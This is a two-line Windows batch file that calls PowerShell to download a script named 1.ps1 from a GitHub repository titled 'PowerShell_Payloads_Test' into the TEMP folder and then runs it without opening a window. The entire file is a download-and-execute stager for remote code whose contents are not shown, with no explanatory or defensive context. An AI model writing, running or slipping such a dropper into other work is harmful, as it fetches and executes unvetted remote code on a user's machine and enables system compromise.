@echo off
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/YimuQrrr/PowerShell_Payloads_Test/blob/a269e297ef7af4fc372d9a88b17fa9546f68dd19/1.ps1' -OutFile '%TEMP%\1.ps1'; Start-Process powershell -ArgumentList '-File %TEMP%\1.ps1' -NoNewWindow -Wait"
